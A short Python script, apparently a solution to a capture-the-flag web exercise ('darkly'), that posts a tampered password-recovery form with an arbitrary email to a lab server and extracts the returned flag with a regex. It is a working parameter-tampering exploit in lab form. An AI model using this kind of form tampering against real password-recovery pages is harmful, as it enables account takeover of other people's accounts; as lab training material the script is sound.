import os
import requests
import re

ip = os.getenv('darkly_ip')
baseurl = f'http://{ip}'

if __name__ == '__main__':
    r = requests.post(baseurl + '/index.php?page=recover', data={
        'mail': 'toto@toto.com',
        'Submit': 'Submit'
    })
    m = re.findall('The flag is : ([a-z0-9]+)<', r.text)
    print(*m)

